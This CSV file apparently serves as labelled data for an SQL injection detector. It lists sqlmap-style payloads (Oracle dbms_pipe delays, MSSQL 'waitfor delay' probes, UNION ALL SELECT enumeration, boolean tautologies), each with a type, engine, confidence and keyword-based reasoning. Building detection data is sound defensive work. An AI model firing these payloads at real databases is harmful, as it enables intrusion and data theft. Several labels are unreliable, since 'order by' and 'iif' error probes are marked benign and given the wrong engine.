id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23215,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
23211,"-8797"" ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
23221,"1"" ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
23223,"-4015'|| ( select 'qeqv' from dual where 1437 = 1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
23233,1' ) where 8142 = 8142 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23283,1' ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23291,"iif ( 2840 = 3788,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23341,1%' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 17 chars.,2
23348,"iif ( 1149 = 4765,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23365,1%' ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23368,"iif ( 6369 = 5881,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
23378,"1%"" ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
23386,"1, ( case when 2872 = 2872 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 49 chars.,2
23395,"waitfor delay '0:0:5' and ( ( ""ykgm"" = ""ykgm",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
23206,"-5438"" ) union all select 3170,3170--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
23207,"-1368 ) ) union all select 1310,1310,1310,1310,1310#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
23208,"-1550' in boolean mode ) union all select 9777,9777,9777--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
23214,"1' where 2964 = 2964 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
23217,"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
23222,1' and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
23224,"-7418 union all select 1340,1340,1340,1340,1340#",union_based,generic,0.7,UNION-based payload detected. Payload length: 48 chars.,2
23229,"1' ) ) as tgso where 1349 = 1349 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
23234,"-1275"" union all select 7861,7861,7861,7861,7861#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
23236,"1%' ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
23239,"-6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
23244,"1%' ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
23246,"-6987' union all select 4721,4721--",union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
23247,"-5360' where 8178 = 8178 union all select 8178,8178,8178--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
23249,"-8875"" ) where 8428 = 8428 or 1519 = 5756--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 43 chars.,2
23254,-9771' or 5113 = 5365,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
23257,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
23258,-4965 ) as imga where 3705 = 3705 union all select 3705--,union_based,generic,0.7,UNION-based payload detected. Payload length: 57 chars.,2
